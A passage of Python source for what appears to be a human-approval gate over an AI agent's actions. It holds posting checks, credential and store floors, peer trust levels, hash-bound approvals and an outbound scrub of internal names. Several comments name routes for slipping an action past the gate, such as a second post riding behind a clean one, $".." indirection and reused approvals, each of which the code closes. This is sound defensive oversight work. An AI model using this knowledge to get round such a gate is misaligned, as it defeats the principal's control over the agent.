        unseen_body signal. _combine gives the part it picks every part's signals, so this reads
        the ones it carried before (own_signals). A part given them some other way counts a
        signal a part below it also carries as that part's, not its own."""
        if p.text_file and not p.text and (p.category in OUTBOUND or p.category == "vcs_merge"):
            return True
        if p.own_signals is not None:
            return "unseen_body" in p.own_signals
        return "unseen_body" in p.signals and not any(
            "unseen_body" in q.signals for q in _each_part(p) if q is not p)

    # #396: the checks run on every post on the line, not only on the dominant part's text, so a
    # clean first post cannot carry a second one past the footer, the forbidden words and the
    # scrub. A part counts when its category is under applies_to (a close or merge carrying text
    # counts, #326, #397) and it carries text, a title or an unseen body. The combined
    # classification's own violations and the line-wide unseen note stay bare and are all listed;
    # another part's are named after it, and only so many of those are listed (_LISTED_VIOLATIONS)
    # that a line of many posts keeps its reason and its card short.
    checked, post_unseen_seen = False, False
    named: list[str] = []
    for p in _each_part(eff):
        p_unseen = post_unseen(p)
        if p.category not in applies_to and not (p.category in ("github_close", "vcs_merge")
                                                 and (p.text or p.title or p_unseen)):
            continue
        if not (p.text or p.title or p_unseen):
            continue
        checked = True
        found = check_post(p.text, posting, title=p.title, agents=pol.get("agents") or [],
                           exposure=p.exposure)
        found += check_scrub(p.text, pol.get("scrub"), title=p.title, exposure=p.exposure)  # D-033
        if p_unseen:  # the checks above saw only part of this post, so they cannot pass it
            found.append(UNSEEN_BODY)
            post_unseen_seen = True
        if p is eff:
            violations += found
        else:
            named += [f"{p.summary or p.category}: {v}" for v in found]
    if unseen and not post_unseen_seen and (checked or line_applies):
        violations.append(UNSEEN_BODY)  # a body on a part the posting rules do not cover is still unseen
    room = max(_LISTED_VIOLATIONS - len(violations), 0)
    violations += named[:room] + ([f"and {len(named) - room} more on other posts"] if len(named) > room else [])
    if violations:
        bump("ask", "posting rules: " + "; ".join(violations), "posting")

    # Operator floor (P11): outside the principal model, cannot be lowered by policy.
    if eff.reversibility == "irreversible" and eff.exposure == "public" and eff.third_party:
        bump("ask", "irreversible, public and affects a third party", "floor")

    # Credentials floor: no policy, rule, scope or escalate setting lowers this. The principal answers.
    if eff.category == "credentials":
        bump("ask", "credentials always ask the principal", "floor")

    # Store floor (D-038): the gate's own policies, grants, ledger, keys, seats and sockets. Same terms.
    if eff.category == "store_write":
        bump("ask", "writes to the Exo store; only the principal approves, every time", "floor")

    # #191: a category line or rule that would deny a part alone denies the line, as a deny entry does (D-075).
    if outcome != "deny" and (part := _override_deny(eff, gates, passed)):
        p, why, step = part
        outcome, reason, rule = "deny", f"denied by policy ({why}: {p.summary or p.category})", step
    if (denied := _part_hits(gates.get("deny") or [], eff)):
        outcome, reason, rule = "deny", f"denied by policy ({denied[0][1]})", "deny"
    d = Decision(outcome=outcome, reason=reason, rule=rule, violations=violations,
                 exposure=eff.exposure, third_party=eff.third_party,
                 reserved=list(dict.fromkeys((p.category, p.target) for p, _ in reserved)))
    if "locale translation" in c.signals and c.category != "opaque_exec":
        # A $".." word can turn into any code (#136): decide the line as opaque_exec too, and keep the stricter.
        # `replace` keeps the parts as classifications, so their deny and reserved entries still apply. That
        # reading is the gate's, not a command's, so it has no own text: no rule that would lower it passes the
        # own text test on a compound line (#394), while a line of one part still matches its command text.
        rev, exp, third = CATEGORIES["opaque_exec"]
        alt = _decide(replace(c, category="opaque_exec", reversibility=rev, exposure=exp, third_party=third,
                              signals=["indirection"], own=None), pol, ctx, passed)
        if OUTCOMES.index(alt.outcome) > OUTCOMES.index(d.outcome):
            return alt
    return d


def summarize(c: Classification, d: Decision, default: str = "skip") -> str:
    """The one-line question the principal sees for an `ask`."""
    bits = [c.summary or c.tool or c.category]
    axes = [c.reversibility, d.exposure or c.exposure]
    if d.third_party:
        axes.append("third party")
    if c.cost:
        axes.append(f"cost {c.cost:g}")
    line = f"{bits[0]} ({', '.join(axes)}). Why: {d.reason}."
    if c.link:
        line += f" Link: {c.link}."
    line += f" Default if no reply: {default}."
    return " ".join(line.split())


# --- peer messages (D-026) -------------------------------------------------------------------

PEER_OUTCOMES = ("auto", "hold", "deny")
PEER_TRUST = ("principal", "same-principal", "other", "remote", "unverified")
# Who wrote it, as the receiving side could check it. A person typing in a client of this seat is the
# principal; another session of the same principal on this machine is same-principal; a session of a
# different or unknown principal is other; a bus seat is remote; a bad or missing signature is unverified.
PEER_DEFAULTS = {"principal": "auto", "same-principal": "auto", "other": "hold", "remote": "hold",
                 "unverified": "deny"}


def decide_peer(trust: str, sender: str = "", config: Mapping | None = None) -> tuple[str, str]:
    """``(outcome, reason)`` for a message from ``sender`` at ``trust``: auto, hold or deny.

    ``config`` is the receiving seat's ``peers`` settings: ``policy`` maps a trust level to an outcome, and
    ``rules`` (``{"from": glob, "outcome": ...}``, first match wins) override it for named senders. An
    unverified sender is denied whatever the config says, and no setting makes a peer message consent to
    anything: this decides delivery only."""
    config = config or {}
    if trust == "unverified":
        return "deny", "the signature did not verify"
    for rule in config.get("rules") or []:
        if isinstance(rule, Mapping) and fnmatch.fnmatch(sender, str(rule.get("from") or "")):
            out = str(rule.get("outcome") or "")
            if out in PEER_OUTCOMES:
                return out, f"rule for {rule['from']}"
    table = {**PEER_DEFAULTS, **{k: v for k, v in (config.get("policy") or {}).items() if v in PEER_OUTCOMES}}
    out = table.get(trust, "hold")
    return out, f"{trust} sender: {out}"


# --- YAML subset reader (stdlib only) ------------------------------------------------------
#
# Supports what the policy files use: nested mappings by indentation, block lists of scalars
# or mappings, flow lists `[a, "b"]` and flow maps `{k: v}`, quoted and plain scalars (int,
# float, true/false, null), `#` comments, and folded `>` or literal `|` block scalars.
# Not supported: anchors, tags, multi-document streams, complex keys.

def _strip_comment(line: str) -> str:
    q, i = "", 0
    while i < len(line):
        ch = line[i]
        if q:
            if ch == "\\" and q == '"':
                i += 2
                continue
            if ch == q:
                q = ""
        elif ch in "'\"" and (i == 0 or line[i - 1] in " \t:[{,-"):
            q = ch
        elif ch == "#" and (i == 0 or line[i - 1] in " \t"):
            return line[:i].rstrip()
        i += 1
    return line.rstrip()


def _scalar(s: str) -> Any:
    s = s.strip()
    if s == "":
        return None
    if s[0] in "[{":
        val, rest = _flow(s, 0)
        if s[rest:].strip():
            raise PolicyError(f"trailing text after flow value: {s!r}")
        return val
    if s[0] == '"':
        if not s.endswith('"') or len(s) < 2:
            raise PolicyError(f"unterminated string: {s!r}")
        return json.loads(s)
    if s[0] == "'":
        if not s.endswith("'") or len(s) < 2:
            raise PolicyError(f"unterminated string: {s!r}")
        return s[1:-1].replace("''", "'")
    low = s.lower()
    if low in ("true", "yes", "on"):
        return True
    if low in ("false", "no", "off"):
        return False
    if low in ("null", "~"):
        return None
    if re.fullmatch(r"[-+]?\d+", s):
        return int(s)
    if re.fullmatch(r"[-+]?(\d+\.\d*|\.\d+|\d+)([eE][-+]?\d+)?", s):
        return float(s)
    return s


def _flow(s: str, i: int) -> tuple[Any, int]:
    """Parse a flow value starting at s[i]; return (value, index after it)."""
    while i < len(s) and s[i] in " \t":
        i += 1
    if s[i] == "[":
        out, i = [], i + 1
        while True:
            while i < len(s) and s[i] in " \t,":
                i += 1
            if i >= len(s):
                raise PolicyError(f"unterminated flow list: {s!r}")
            if s[i] == "]":
                return out, i + 1
            v, i = _flow(s, i)
            out.append(v)
    if s[i] == "{":
        out, i = {}, i + 1
        while True:
            while i < len(s) and s[i] in " \t,":
                i += 1
            if i >= len(s):
                raise PolicyError(f"unterminated flow map: {s!r}")
            if s[i] == "}":
                return out, i + 1
            k, i = _flow_atom(s, i, stop=":")
            if i >= len(s) or s[i] != ":":
                raise PolicyError(f"flow map key without value: {s!r}")
            v, i = _flow(s, i + 1)
            out[str(k)] = v
    return _flow_atom(s, i, stop=",]}")


def _flow_atom(s: str, i: int, stop: str) -> tuple[Any, int]:
    while i < len(s) and s[i] in " \t":
        i += 1
    if i < len(s) and s[i] in "[{":
        return _flow(s, i)
    if i < len(s) and s[i] in "'\"":
        q, j = s[i], i + 1
        while j < len(s):
            if s[j] == "\\" and q == '"':
                j += 2
                continue
            if s[j] == q:
                if q == "'" and j + 1 < len(s) and s[j + 1] == "'":
                    j += 2
                    continue
                break
            j += 1
        return _scalar(s[i:j + 1]), j + 1
    j = i
    while j < len(s) and s[j] not in stop:
        j += 1
    return _scalar(s[i:j]), j


_KEY = re.compile(r"""^("(?:[^"\\]|\\.)*"|'(?:[^']|'')*'|[^\s'"#\-\[\]{}][^:#]*?|-[^\s][^:#]*?)\s*:(?:\s+|$)(.*)$""")


def parse_yaml(text: str) -> Any:
    """Parse the YAML subset described above. Raises PolicyError on malformed input."""
    raw = text.replace("\t", "    ").splitlines()
    lines: list[tuple[int, str, int]] = []      # (indent, content, raw index)
    for n, line in enumerate(raw):
        body = _strip_comment(line)
        if body.strip() in ("---", "...") and not body.startswith(" "):
            continue
        if body.strip():
            lines.append((len(body) - len(body.lstrip(" ")), body.strip(), n))
    if not lines:
        return None
    val, i = _block(lines, 0, lines[0][0], raw)
    if i != len(lines):
        raise PolicyError(f"unexpected indentation at line {lines[i][2] + 1}: {lines[i][1]!r}")
    return val


def _block_scalar(lines, i, parent_indent, raw, style) -> tuple[str, int]:
    # Collect raw lines (keeping blank ones) indented deeper than the parent.
    start = lines[i - 1][2] + 1
    end_idx = i
    while end_idx < len(lines) and lines[end_idx][0] > parent_indent:
        end_idx += 1
    stop = lines[end_idx][2] if end_idx < len(lines) else len(raw)
    chunk = raw[start:stop]
    while chunk and not chunk[-1].strip():
        chunk.pop()
    ind = min((len(x) - len(x.lstrip(" ")) for x in chunk if x.strip()), default=0)
    chunk = [x[ind:] for x in chunk]
    if style.startswith("|"):
        text = "\n".join(chunk)
    else:
        paras, cur = [], []
        for x in chunk:
            if x.strip():
                cur.append(x.strip())
            else:
                paras.append(" ".join(cur))
                cur = []
        paras.append(" ".join(cur))
        text = "\n".join(p for p in paras)
    if not style.endswith("-"):
        text += "\n"
    return text, end_idx


def _block(lines, i, indent, raw) -> tuple[Any, int]:
    if lines[i][1].startswith("- ") or lines[i][1] == "-":
        return _list(lines, i, indent, raw)
    return _map(lines, i, indent, raw)


def _value_after_key(lines, i, indent, rest, raw) -> tuple[Any, int]:
    """Value for a `key:` at `indent` whose inline part is `rest`; `i` is the next line."""
    if rest in (">", ">-", ">+", "|", "|-", "|+"):
        return _block_scalar(lines, i, indent, raw, rest)
    if rest:
        return _scalar(rest), i
    if i < len(lines) and lines[i][0] > indent:
        return _block(lines, i, lines[i][0], raw)
    if i < len(lines) and lines[i][0] == indent and (lines[i][1].startswith("- ") or lines[i][1] == "-"):
        return _list(lines, i, indent, raw)
    return None, i


def _map(lines, i, indent, raw) -> tuple[dict, int]:
    out: dict = {}
    while i < len(lines) and lines[i][0] == indent:
        content = lines[i][1]
        if content.startswith("- "):
            break
        m = _KEY.match(content)
        if not m:
            raise PolicyError(f"expected 'key: value' at line {lines[i][2] + 1}: {content!r}")
        key = m.group(1)
        if key[0] in "'\"":
            key = _scalar(key)
        val, i = _value_after_key(lines, i + 1, indent, m.group(2).strip(), raw)
        out[str(key)] = val
    if i < len(lines) and lines[i][0] > indent:
        raise PolicyError(f"unexpected indentation at line {lines[i][2] + 1}: {lines[i][1]!r}")
    return out, i


def _list(lines, i, indent, raw) -> tuple[list, int]:
    out: list = []
    while i < len(lines) and lines[i][0] == indent and (lines[i][1].startswith("- ") or lines[i][1] == "-"):
        content = lines[i][1][1:].lstrip(" ")
        col = indent + (len(lines[i][1]) - len(content))
        if not content:
            if i + 1 < len(lines) and lines[i + 1][0] > indent:
                val, i = _block(lines, i + 1, lines[i + 1][0], raw)
            else:
                val, i = None, i + 1
            out.append(val)
            continue
        if _KEY.match(content) and content[0] not in "[{\"'":
            # mapping item: re-read this line as a mapping line at the content column
            lines[i] = (col, content, lines[i][2])
            val, i = _map(lines, i, col, raw)
            out.append(val)
            continue
        if content.startswith(("- ", "-")) and content != "-" and content[1:2] == " ":
            lines[i] = (col, content, lines[i][2])
            val, i = _list(lines, i, col, raw)
            out.append(val)
            continue
        out.append(_scalar(content))
        i += 1
    return out, i


# --- loading a store's policies (I/O) ------------------------------------------------------

_FENCE = re.compile(r"^```ya?ml[^\n]*\n(.*?)^```", re.M | re.S)


def parse_posting_md(text: str) -> dict:
    """Machine-readable posting checks live in fenced ```yaml blocks inside posting.md."""
    out: dict = {}
    for m in _FENCE.finditer(text):
        val = parse_yaml(m.group(1))
        if isinstance(val, Mapping):
            out.update(val.get("posting", val) if isinstance(val.get("posting", val), Mapping) else val)
    return out


def _agent_names(agents_dir: Path) -> list[str]:
    names: list[str] = []
    if not agents_dir.is_dir():
        return names
    for p in sorted(agents_dir.iterdir()):
        if p.name.startswith((".", "_")) or p.name.lower() in ("readme.md", "index.md"):
            continue
        stem = p.stem if p.is_file() else p.name
        names.append(stem)
        if p.is_file() and p.suffix == ".md":
            m = re.search(r"^name:\s*['\"]?([^'\"\n]+)", p.read_text(encoding="utf-8", errors="replace")[:2000], re.M)
            if m and m.group(1).strip() not in names:
                names.append(m.group(1).strip())
    return names


def policy_files(root: str | Path) -> list[Path]:
    pdir = Path(root) / "policies"
    return [pdir / n for n in ("gates.yaml", "budget.yaml", "interruptions.yaml", "posting.md", "posting.yaml",
                               "approvals.yaml")]


def load_policies(root: str | Path | None) -> dict:
    """Read `<root>/policies/` and `<root>/agents/` into normalized policies. A missing root or
    missing files fall back to the defaults (which ask on anything irreversible or public)."""
    if not root:
        return normalize_policies({"internal_names": internal_names(None)})
    root = Path(root)
    pdir = root / "policies"
    raw: dict = {}
    for name, key in (("gates.yaml", "gates"), ("budget.yaml", "budget"), ("interruptions.yaml", "interruptions")):
        p = pdir / name
        if p.is_file():
            try:
                raw[key] = parse_yaml(p.read_text(encoding="utf-8")) or {}
            except PolicyError as e:
                raise PolicyError(f"{p}: {e}") from None
    posting: dict = {}
    if (pdir / "posting.md").is_file():
        try:
            posting.update(parse_posting_md((pdir / "posting.md").read_text(encoding="utf-8")))
        except PolicyError as e:
            raise PolicyError(f"{pdir / 'posting.md'}: {e}") from None
    if (pdir / "posting.yaml").is_file():
        posting.update(parse_yaml((pdir / "posting.yaml").read_text(encoding="utf-8")) or {})
    raw["posting"] = posting
    if posting.get("forbid_agent_names"):
        raw["agents"] = _agent_names(root / "agents")
    raw["approvals"] = load_approvals(root)  # D-033
    raw["internal_names"] = internal_names(root)
    return normalize_policies(raw)


# --- approval binding, authority and standing grants (D-033) ---------------------------------
#
# An approval for an outward act (posting, email, social, payment, or anything public or
# irreversible) is bound to a hash of the exact text, title, target and arguments. Any edit
# gives a new hash, so an old approval or standing grant no longer covers it. Who may answer
# is a small table in policies/approvals.yaml: category -> principal, seat:<name> or
# role:<name>. The principal can always answer; an empty table means only the principal.

APPROVER_DEFAULT = ("principal",)
_APPROVER_ENTRY = re.compile(r"^(principal|seat:[a-z0-9][a-z0-9_-]*|role:[a-z0-9][a-z0-9_-]*)$")
DEFAULT_APPROVALS: dict = {"default": list(APPROVER_DEFAULT), "categories": {}, "roles": {},
                           "always_days": 30.0, "outward_always_days": 7.0}


def binds_exact(c: Classification, d: Decision | None = None) -> bool:
    """True when an approval or grant must cover only this exact call: outward acts (``is_outward``),
    and code the gate cannot see into (D-038), so one "always" never covers a different script."""
    return is_outward(c, d) or c.category in ("opaque_exec",) + NO_GRANT or "indirection" in c.signals


def is_outward(c: Classification, d: Decision | None = None) -> bool:
    """True when an approval must bind to the exact text: posts, messages, money, and anything
    public or irreversible."""
    exposure = (d.exposure if d is not None and d.exposure else c.exposure)
    return (c.category in OUTBOUND or c.category in ("payment", "account") or exposure == "public"
            or c.reversibility == "irreversible")


def approval_binding(c: Classification, args: Mapping | None = None) -> str:
    """sha256 over the outbound text, title, target, tool and full arguments. Text read from a
    body file counts too, so editing the file voids the approval."""
    doc = {"category": c.category, "tool": c.tool, "target": c.target, "title": c.title, "text": c.text,
           "command": c.command, "args": dict(args or {})}
    raw = json.dumps(doc, sort_keys=True, default=str, ensure_ascii=False)
    return hashlib.sha256(raw.encode("utf-8")).hexdigest()


def _approver_list(v: Any, where: str) -> list[str]:
    out = []
    for e in _as_list(v or []):
        e = str(e).strip().lower()
        if not _APPROVER_ENTRY.match(e):
            raise PolicyError(f"{where}: approver {e!r} must be principal, seat:<name> or role:<name>")
        out.append(e)
    return out


def normalize_approvals(raw: Mapping | None) -> dict:
    """``policies/approvals.yaml`` into ``{default, categories, roles, always_days, outward_always_days}``."""
    raw = dict(raw or {})
    out = json.loads(json.dumps(DEFAULT_APPROVALS))
    table = raw.get("approvers") or {}
    if not isinstance(table, Mapping):
        raise PolicyError("approvals.approvers must be a mapping of category: [approvers]")
    if table.get("default") is not None:
        out["default"] = _approver_list(table["default"], "approvals.approvers.default")
    cats = table.get("categories")
    if cats is None:
        cats = {k: v for k, v in table.items() if k != "default"}
    if not isinstance(cats, Mapping):
        raise PolicyError("approvals.approvers.categories must be a mapping")
    out["categories"] = {str(k): _approver_list(v, f"approvals.approvers.{k}") for k, v in cats.items()}
    roles = raw.get("roles") or {}
    if not isinstance(roles, Mapping):
        raise PolicyError("approvals.roles must be a mapping of role: [seat:<name>, ...]")
    out["roles"] = {}
    for k, v in roles.items():
        members = _approver_list(v, f"approvals.roles.{k}")
        if any(m.startswith("role:") for m in members):
            raise PolicyError(f"approvals.roles.{k}: a role lists seats or principal, not other roles")
        out["roles"][str(k).lower()] = members
    for lst in [out["default"], *out["categories"].values()]:
        for e in lst:
            if e.startswith("role:") and e[5:] not in out["roles"]:
                raise PolicyError(f"approvals: {e} is not defined under roles")
    always = raw.get("always") or {}
    if not isinstance(always, Mapping):
        raise PolicyError("approvals.always must be a mapping")
    for src, dst in (("days", "always_days"), ("outward_days", "outward_always_days")):
        if always.get(src) is not None:
            try:
                out[dst] = max(0.0, float(always[src]))
            except (TypeError, ValueError):
                raise PolicyError(f"approvals.always.{src} must be a number") from None
    return out


def approvers_for(category: str, approvals: Mapping | None) -> list[str]:
    """Who may answer an ask in ``category``: ``principal`` and ``seat:<name>`` entries, roles
    expanded. The principal is always first: their consent is the root of every approval."""
    if category in PRINCIPAL_ONLY:
        return ["principal"]         # D-038: the store is the principal's alone, whatever approvals.yaml says
    a = approvals or DEFAULT_APPROVALS
    entries = (a.get("categories") or {}).get(category, a.get("default") or list(APPROVER_DEFAULT))
    out = ["principal"]
    for e in entries:
        for m in (a.get("roles") or {}).get(e[5:], []) if e.startswith("role:") else [e]:
            if m not in out:
                out.append(m)
    return out


def strictest_approvers(category: str, pinned: Mapping | None, changed: Mapping | None = None) -> list[str]:
    """Who may answer while a changed ``approvals.yaml`` waits for ``/gate accept`` (D-038, #211): the approvers
    both the pinned and the changed table allow, in the pinned order. The principal is first in both, so the
    list is never empty. With no change pending it is ``approvers_for(category, pinned)``."""
    first = approvers_for(category, pinned)
    if changed is None:
        return first
    second = set(approvers_for(category, changed))
    return [a for a in first if a in second]


def approver_identity(client: str) -> str:
    """The identity an answer counts as. ``seat:<name>`` is a seat; a peer or ingress client is ``peer`` (never
    consent, D-026); ``principal`` or ``principal:<label>`` is the principal. The core stamps that from the
    connection, never from a body (D-039). Anything else, the empty string included, is ``unknown``."""
    c = (client or "").strip().lower()
    if c.startswith(("peer", "ingress")):
        return "peer"
    if c.startswith("seat:"):
        return "seat:" + c[5:].strip()
    if c == "principal" or c.startswith("principal:"):
        return "principal"
    return "unknown"


def approver_allowed(client: str, allowed: Iterable[str] | None) -> bool:
    """May ``client`` answer an ask whose allowed list is ``allowed``? An empty list keeps the old rule: the
    principal or a seat. A peer or an unknown answerer never may."""
    ident = approver_identity(client)
    if ident in ("peer", "unknown"):
        return False
    allowed = list(allowed or [])
    if not allowed:
        return True
    return ident in allowed


def load_approvals(root: str | Path | None) -> dict:
    """Read ``<root>/policies/approvals.yaml``; defaults when missing."""
    if not root:
        return {}
    p = Path(root) / "policies" / "approvals.yaml"
    if not p.is_file():
        return {}
    try:
        return parse_yaml(p.read_text(encoding="utf-8")) or {}
    except PolicyError as e:
        raise PolicyError(f"{p}: {e}") from None


# --- outbound scrub (D-033) -------------------------------------------------------------------
#
# Posts to public targets are swept for internal identifiers: seat and agent names, home paths,
# model ids and internal task or thread ids. The names come from the seat files, the agents/
# folder, the bus registry and the user's own list. A hit holds the post (ask) and lists what
# was found. Matching tradeoff: a name that is one plain word ("scout", "builder") matches only
# as a whole token, so "scouting" passes but "the scout said" is held. A name with a hyphen,
# underscore or digit ("saga-divan") is distinctive, so it also matches inside longer words and
# with any separator ("saga divan", "saga_divan"). Add a word to ``scrub.allow`` to stop a
# false positive.

DEFAULT_SCRUB: dict = {"enabled": True, "exposures": ["public"], "seat_names": True, "home_paths": True,
                       "model_ids": True, "internal_ids": True, "names": [], "patterns": [], "allow": [],
                       "model_patterns": [r"\bclaude-[a-z]+-\d[\w.-]*", r"\bgpt-\d[\w.-]*"]}
_HOME_PATTERNS = [(r"(?<![\w./-])~/", "home path"), (r"/Users/[A-Za-z0-9._-]+", "home path"),
                  (r"/home/[A-Za-z0-9._-]+", "home path")]
# exo ids are <prefix>_<16 hex> (protocol.schema.new_id): sessions, tasks, jobs, approvals.
_INTERNAL_ID = r"\b[a-z]{1,5}_[0-9a-f]{16}\b"


def _catalog_models() -> tuple[list[str], list[str]]:
    """``(model names, provider names)`` from the model catalog. Empty on any read error."""
    global _CATALOG_CACHE
    if _CATALOG_CACHE is not None:
        return _CATALOG_CACHE
    names: set[str] = set()
    providers: set[str] = set()
    try:
        import tomllib
        data = tomllib.loads((Path(__file__).parent / "core" / "models" / "catalog.toml").read_text("utf-8"))
        providers = {str(p) for p in (data.get("providers") or {})}
        refs = list(data.get("models") or {})
        for routes in (data.get("roles") or {}).values():
            refs += [str(r) for r in (routes if isinstance(routes, list) else [])]
        for ref in refs:
            model = str(ref).partition(":")[2]
            if model:
                names.add(model)
                names.add(model.rsplit("/", 1)[-1])
    except Exception:
        pass
    _CATALOG_CACHE = (sorted(names), sorted(providers))
    return _CATALOG_CACHE


_CATALOG_CACHE: tuple[list[str], list[str]] | None = None


def name_pattern(name: str) -> str:
    """Regex for one internal name. Plain words match only as whole tokens; distinctive names
    (a hyphen, underscore or digit, four characters or more) also match inside words and with
    any separator."""
    n = name.strip()
    if re.fullmatch(r"[A-Za-z]+", n) or len(n) < 4:
        return r"(?<![\w-])" + re.escape(n) + r"(?![\w-])"
    parts = [p for p in re.split(r"[-_ .]+", n) if p]
    return r"[-_ .]?".join(re.escape(p) for p in parts)


def normalize_scrub(raw: Mapping | None, names: Iterable[str] = ()) -> dict:
    """``posting.scrub`` plus discovered internal names into ``{enabled, exposures, rules, allow}``.
    Each rule is ``{pattern, label}``; matching is case-insensitive."""
    cfg = json.loads(json.dumps(DEFAULT_SCRUB))
    raw = raw if isinstance(raw, Mapping) else {}
    for k, v in raw.items():
        cfg[k] = v
    for k in ("exposures", "names", "patterns", "allow", "model_patterns"):
        if not isinstance(cfg.get(k) or [], list):
            raise PolicyError(f"posting.scrub.{k} must be a list")
    rules: list[dict] = []
    seen: set[str] = set()

    def add(pattern: str, label: str) -> None:
        if pattern and pattern not in seen:
            try:
                re.compile(pattern)
            except re.error as e:
                raise PolicyError(f"posting.scrub: bad pattern {pattern!r}: {e}") from None
            seen.add(pattern)
            rules.append({"pattern": pattern, "label": label})

    all_names = [str(n) for n in (cfg.get("names") or [])]
    if cfg.get("seat_names", True):
        all_names += [str(n) for n in names]
    for n in dict.fromkeys(x.strip() for x in all_names):
        if n:
            add(name_pattern(n), "internal name")
    if cfg.get("home_paths", True):
        for p, label in _HOME_PATTERNS:
            add(p, label)
    if cfg.get("model_ids", True):
        models, providers = _catalog_models()
        for m in models:
            add(name_pattern(m), "model id")
        if providers:
            add(r"\b(?:" + "|".join(re.escape(p) for p in providers) + r"):[\w./-]+", "model id")
        for p in cfg.get("model_patterns") or []:
            add(str(p), "model id")
    if cfg.get("internal_ids", True):
        add(_INTERNAL_ID, "internal id")
    for p in cfg.get("patterns") or []:
        if isinstance(p, Mapping):
            add(str(p.get("pattern") or ""), str(p.get("label") or "internal pattern"))
        else:
            add(str(p), "internal pattern")
    return {"enabled": bool(cfg.get("enabled", True)), "exposures": [str(x) for x in cfg.get("exposures") or []],
            "rules": rules, "allow": [str(a).lower() for a in cfg.get("allow") or []]}


@functools.lru_cache(maxsize=16)
def _scrub_compiled(patterns: tuple[str, ...]) -> tuple[re.Pattern, ...]:
    """The scrub patterns, compiled once (#396). A line is scrubbed once per post on it, and a policy with more
    patterns than the `re` module's cache keeps would compile every one of them again for each post."""
    return tuple(re.compile(p, re.I) for p in patterns)


def check_scrub(text: str, scrub: Mapping | None, *, title: str = "", exposure: str = "public") -> list[str]:
    """Internal identifiers found in outbound text, as ``"<label>: <match>"``. Empty = clean."""
    if not scrub or not scrub.get("enabled") or exposure not in (scrub.get("exposures") or []):
        return []
    both = "\n".join(x for x in (title, text) if x)
    if not both:
        return []
    allow = set(scrub.get("allow") or [])
    out: list[str] = []
    rules = scrub.get("rules") or []
    for r, rx in zip(rules, _scrub_compiled(tuple(str(r["pattern"]) for r in rules))):
        for m in rx.finditer(both):
            hit = m.group(0)
            if hit.lower() in allow:
                continue
            v = f"{r['label']}: {hit}"
            if v not in out:
                out.append(v)
            break
    return out[:20]


def scrub_sources(root: str | Path | None, env: Mapping[str, str] | None = None) -> list[Path]:
    """Files and folders the scrub names come from (the hook watches them for changes)."""
    env = os.environ if env is None else env
    exo_home = Path(env.get("EXO_HOME") or Path.home() / ".exo").expanduser()
    paths = [exo_home / "seats", Path(env.get("EXO_BUS_REGISTRY") or exo_home / "bus" / "registry.json")]
    if env.get("EXO_INTERNAL_NAMES"):
        paths.append(Path(env["EXO_INTERNAL_NAMES"]).expanduser())
    if root:
        paths += [Path(root) / "agents", Path(root) / "policies" / "internal-names.txt"]
    return paths


def internal_names(root: str | Path | None, env: Mapping[str, str] | None = None) -> list[str]:
    """Seat names from ``$EXO_HOME/seats`` and the bus registry, agent names from the store, and
    the user's list (``policies/internal-names.txt`` or ``$EXO_INTERNAL_NAMES``, one per line)."""
    names: list[str] = []
    for p in scrub_sources(root, env):
        try:
            if p.name == "seats" and p.is_dir():
                names += [q.stem if q.is_file() else q.name for q in sorted(p.iterdir())
                          if not q.name.startswith((".", "_")) and (q.is_dir() or q.suffix in (".toml", ".json"))]
            elif p.name == "agents" and p.is_dir():
                names += _agent_names(p)
            elif p.suffix == ".json" and p.is_file():
                doc = json.loads(p.read_text(encoding="utf-8"))
                names += [str(s.get("seat")) for s in doc.get("seats") or [] if isinstance(s, Mapping) and s.get("seat")]
            elif p.is_file():
                names += [ln.strip() for ln in p.read_text(encoding="utf-8").splitlines()
                          if ln.strip() and not ln.lstrip().startswith("#")]
        except (OSError, ValueError):
            continue
    return list(dict.fromkeys(n for n in names if n))
